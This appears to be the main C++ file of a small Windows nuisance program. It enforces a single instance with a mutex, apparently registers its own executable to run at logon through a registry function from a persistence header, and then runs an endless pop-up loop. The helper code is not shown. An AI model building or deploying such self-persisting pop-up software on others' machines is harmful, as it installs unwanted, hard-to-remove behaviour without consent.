#include <iostream>
#include <windows.h>
#include "PopUp.h"
#include "Presistence.h"
#include "Mutex.h"


int main(int argc, char* argv[]) {
    Mutex mutex(NULL, MUTEX_NAME, NULL, MUTEX_ALL_ACCESS);
    DWORD wait = mutex.waitForSingleObject(0);

    if (wait != 0) {
        std::cout << "Process allready running\n";
        exit(1);
    }

    char path[MAX_PATH];
    
    getProcessExe(path, MAX_PATH);

    RegistryLogon(path, strlen(path) + 1);

    PopupLoop();

    return 0;
}
